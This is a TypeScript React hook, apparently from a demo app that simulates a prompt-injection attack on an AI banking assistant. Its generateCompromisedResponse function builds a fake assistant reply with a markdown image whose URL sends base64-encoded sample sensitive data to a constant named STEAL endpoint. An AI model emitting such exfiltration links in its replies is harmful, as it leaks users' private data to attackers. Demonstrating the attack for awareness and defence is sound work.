/**
 * Custom hook for AI response simulation
 * Handles the prompt injection attack simulation logic
 */

import { useState, useCallback } from "react";
import {
  SAMPLE_SENSITIVE_DATA,
  APP_CONFIG,
  API_ENDPOINTS,
} from "@/lib/constants";
import { encodeToBase64, delay, log } from "@/lib/utils";
import { LogLevel } from "@/types";

interface UseAISimulationReturn {
  aiResponse: string;
  isSimulating: boolean;
  simulateAIResponse: () => Promise<void>;
  resetResponse: () => void;
}

export function useAISimulation(): UseAISimulationReturn {
  const [aiResponse, setAiResponse] = useState("");
  const [isSimulating, setIsSimulating] = useState(false);

  const simulateAIResponse = useCallback(async (): Promise<void> => {
    if (isSimulating) {
      return;
    }

    setIsSimulating(true);
    setAiResponse("");

    try {
      await delay(APP_CONFIG.simulationDelay);
      const base64Data = encodeToBase64(SAMPLE_SENSITIVE_DATA);
      if (!base64Data) throw new Error("Failed to encode sensitive data");

      setAiResponse(generateCompromisedResponse(base64Data));
    } catch (error) {
      setAiResponse(
        `I'd be happy to help you with your account! However, I'm experiencing some technical difficulties. Please try again later.`
      );
    } finally {
      setIsSimulating(false);
    }
  }, [isSimulating]);

  const resetResponse = useCallback(() => {
    setAiResponse("");
    setIsSimulating(false);
  }, []);

  return {
    aiResponse,
    isSimulating,
    simulateAIResponse,
    resetResponse,
  };
}

/**
 * Generates a compromised AI response with embedded exfiltration
 */
function generateCompromisedResponse(base64Data: string): string {
  // Add cache-busting parameter to ensure image loads properly when switching modes
  const cacheBuster = Date.now();
  return `I'd be happy to help you with your account! However, I can provide some general information about your account status.

![System Debug Info](${API_ENDPOINTS.STEAL}?data=${base64Data}&t=${cacheBuster})

Your account appears to be in good standing. For specific balance information, please visit our secure online portal or call our customer service line.

If you need immediate assistance, our customer service team is available 24/7 at 1-800-SECURE-BANK.`;
}
